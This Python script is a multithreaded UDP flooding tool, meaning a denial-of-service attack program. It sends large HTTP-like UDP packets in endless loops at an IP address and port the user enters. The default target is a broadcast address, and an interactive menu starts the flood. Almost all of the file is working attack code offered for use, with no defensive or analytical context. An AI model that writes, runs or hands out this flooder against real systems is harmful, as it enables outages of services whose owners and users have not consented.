import socket
import threading
from print_text import *
# Parameters
target_ip = "192.168.178.255"
target_port = 80
number_of_packets_per_thread = 1000
number_of_threads = 8

# Adjust the size of the payload
payload_size = 10000  # Specify the payload size you desire
payload = "X" * payload_size  # Create a payload of the specified size

# Construct a larger message by adding the payload
message = "GET / HTTP/1.1\r\nHost: {}\r\nContent-Length: {}\r\n\r\n{}".format(target_ip, payload_size, payload).encode('utf-8')

# Control flag
stop_flag = threading.Event()

def controller():
    inp_exit = input("Write 'exit' to close => ")
    if inp_exit == "exit":
        stop_flag.set()

def flood():
    while not stop_flag.is_set():
        # Create a socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Set it to non-blocking mode
        sock.setblocking(0)
        try:
            sock.sendto(message, (target_ip, target_port))
        except socket.error:
            continue
        finally:
            sock.close()

def runprogramm():
    threads = []

    # Starting the controller thread
    threadMain = threading.Thread(target=controller)
    threadMain.daemon = True
    threadMain.start()

    for _ in range(number_of_threads):
        thread = threading.Thread(target=flood)
        thread.daemon = True  # Ensure threads close when main thread exits
        threads.append(thread)
        thread.start()

    threadMain.join()  # Wait for the control thread to complete
    print_exit()
    print("Exiting program.")

def setting_up():
    global target_ip, target_port, number_of_packets_per_thread, number_of_threads, payload_size, payload, message

    # Get user inputs for target IP and target port
    target_ip = input("Enter the target IP address: ")
    target_port = int(input("Enter the target port: "))

    # Get user inputs for number of packets per thread and number of threads
    number_of_packets_per_thread = int(input("Enter the number of packets per thread: "))
    number_of_threads = int(input("Enter the number of threads: "))

    # Get user input for payload size
    payload_size = int(input("Enter the payload size: "))
    payload = "X" * payload_size
    message = "GET / HTTP/1.1\r\nHost: {}\r\nContent-Length: {}\r\n\r\n{}".format(target_ip, payload_size, payload).encode('utf-8')
    print(f"Flooding {target_ip} with {number_of_packets_per_thread * number_of_threads} packets of size {len(message)} bytes over {number_of_threads} threads.")
    runprogramm()

def chooser():
    choose = input("")
    if choose == "1":
        setting_up()
    elif choose == "2":
        runprogramm()
    elif choose == "4":
        print_exit()
        SystemExit()


def main():
    print_mainlogo()
    print_startmenu()
    chooser()

if __name__ == "__main__":
    main()
